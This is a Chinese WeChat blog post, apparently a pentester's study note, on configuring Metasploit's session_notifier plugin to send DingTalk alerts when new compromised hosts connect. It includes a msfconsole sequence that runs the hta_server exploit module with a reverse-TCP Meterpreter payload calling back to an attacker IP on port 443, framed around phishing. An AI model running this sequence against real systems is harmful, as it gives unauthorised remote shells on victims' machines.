\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/TpC-93r7dA7luEhkiHAi\_g)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

**所有话题标签：**

[#Web 安全](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1558250808926912513&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#漏洞复现](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1558250808859803651&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#工具使用](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1556485811410419713&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#权限提升](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559100355605544960&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

[#权限维持](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1554692262662619137&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#防护绕过](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1553424967114014720&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#内网安全](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559102220258885633&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#实战案例](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1553386251775492098&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

[#其他笔记](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559102973052567553&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#资源分享](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559103254909796352&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect) [](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559103254909796352&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect) [#MSF](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1570778197200322561&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

 |

**0x01 前言**

我们在进行钓鱼攻击或被动提权时可能需要在 MSF 长期监听某个端口，等待管理员执行上线，但又不可能随时都盯着监听界面，这样就不能及时得知是否有新主机上线，是不是很不方便呢？

最近在 metasploit-framework 项目中看到安恒 @三米前有蕉皮老哥提交的 “钉钉通知” 拉取请求，现已被 rapid7 合并到了 session\_notifier 会话通知插件中。

*   https://github.com/rapid7/metasploit-framework/pull/13571
    

**0x01 钉钉机器人 webhook 配置**

我们先在钉钉官网下载 Windows 客户端并注册一个用户进行登录，然后发起一个群组并在群设置中的智能群助手里添加一个自定义机器人。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcySkltj9bkJgJxHvmgdAvYJfVb3tbtZeqvFOicibSFesiamSVEcPlMS91rhgZNKP1nAvOSiaLXjichvLg/640?wx_fmt=png)

  

机器人的名称可以随便取，在安全设置中添加一个自定义关键字 “session”，这是一个不能修改的固定值。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcySkltj9bkJgJxHvmgdAvYFhbRbWjdB9bB8anMic4jqprQQsjSfw2FXCe8NrZJ1eSCIIQS3kHb0lg/640?wx_fmt=png)

****0x02 session\_notifier 插件配置****

msfconole 命令进入 MSF 后先用 load 加载 session\_notifier 插件，将 set\_session\_dingtalk\_webhook 设置为我们钉钉机器人中的 Webhook，然后用 start\_session\_notifier 命令开启会话通知即可。

```
root@:kali~# msfconsole -q
msf6 > load session\_notifier
msf6 > set\_session\_dingtalk\_webhook https://oapi.dingtalk.com/robot/send?access\_token=
msf6 > start\_session\_notifier
```

**![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcySkltj9bkJgJxHvmgdAvYoicmbia7QacZGicYI88QZYU7DWlDANztzWEaqxSqba75VF79uT6iaf8wvw/640?wx_fmt=png)**

**SessionNotifier Commands：**

```
restart\_session\_notifier        //重新启动会话通知
save\_session\_notifier\_settings  //将所有会话通知设置保存到框架
set\_session\_dingtalk\_webhook    //设置DingTalk会话通知(关键字: session)
set\_session\_maximum\_ip          //设置会话通知最大IP范围
set\_session\_minimum\_ip          //设置会话通知最小IP范围
set\_session\_mobile\_carrier      //设置手机的移动运营商
set\_session\_mobile\_number       //设置您要通知的10位手机号码
set\_session\_smtp\_address        //设置会话通知SMTP地址
set\_session\_smtp\_from           //设置SMTP发件人
set\_session\_smtp\_password       //设置SMTP密码
set\_session\_smtp\_port           //设置会话通知SMTP端口
set\_session\_smtp\_username       //设置SMTP用户名
start\_session\_notifier          //开始会话通知
stop\_session\_notifier           //停止会话通知
```

随便设置了一个 hta\_server 监听模块来测试一下看是否能够实时收到新上线主机的通知。  

```
msf6 > use exploit/windows/misc/hta\_server 
msf6 exploit(windows/misc/hta\_server) > set target 1
msf6 exploit(windows/misc/hta\_server) > set payload windows/x64/meterpreter/reverse\_tcp
msf6 exploit(windows/misc/hta\_server) > set lhost 39.\*\*.\*.238
msf6 exploit(windows/misc/hta\_server) > set lport 443
msf6 exploit(windows/misc/hta\_server) > exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcySkltj9bkJgJxHvmgdAvYLuj2VVuMWpHXUdKsDyFa3VFtoiakAwQAlPQyrzlA2icRXtGISianvibKlQ/640?wx_fmt=png)

这里我们可以看到钉钉群组里已经成功的收到了机器人发送过来的新上线主机通知信息！！！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcySkltj9bkJgJxHvmgdAvYkVGM8NBtVhcibPv3bJCV4B7a9dBjBQicaH5CJwOWXLuZTovVricGAeXdA/640?wx_fmt=png)

**【往期 TOP5】**

[绕过 CDN 查找真实 IP 方法总结](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484585&idx=1&sn=28a90949e019f9059cf9b48f4d888b2d&chksm=cfa6a0baf8d129ac29061ecee4f459fa8a13d35e68e4d799d5667b1f87dcc76f5bf1604fe5c5&scene=21#wechat_redirect)

[站库分离常规渗透思路总结](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484281&idx=1&sn=4d9fdae999907b222b0890fccb25bbcc&chksm=cfa6a76af8d12e7c366e0d9c4f256ec6ee6322d900d14732b6499e7df1c13435f14238a19b25&scene=21#wechat_redirect)  

[谷歌浏览器插件 - 渗透测试篇](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484374&idx=1&sn=1bd055173debabded6d15b5730cf7062&chksm=cfa6a7c5f8d12ed31a74c48883ab9dfe240d53a1c0c2251f78485d27728935c3ab5360e973d9&scene=21#wechat_redirect)  

[谷歌浏览器插件推荐 - 日常使用篇](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484349&idx=1&sn=879073cc51e95354df3a36d0ed360b62&chksm=cfa6a7aef8d12eb8874da853904847c8c31ff96de4bab3038ce004c92f3b130c36f24c251cc9&scene=21#wechat_redirect)

[绕过 360 安全卫士提权实战案例](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484136&idx=1&sn=8ca3a1ccb4bb7840581364622c633395&chksm=cfa6a6fbf8d12fedb0526351f1c585a2556aa0bc2017eda524b136dd4c016e0ab3cdc5a3f342&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOfSyD5Wo2fTiaYRzt5iaWg1GJ6X5g7wBvlRrvCcGXUd61L5Aia8VREQibSXkfcwicxpAEoAUMFGfKhHuiaA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfSyD5Wo2fTiaYRzt5iaWg1GJk2Cx54PBIoc0Ia3z1yIfeyfUV61mn3skB5bGP3QHicHudVjMEGhqH4A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)  如果对你有所帮助，点个分享、赞、在看呗！![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)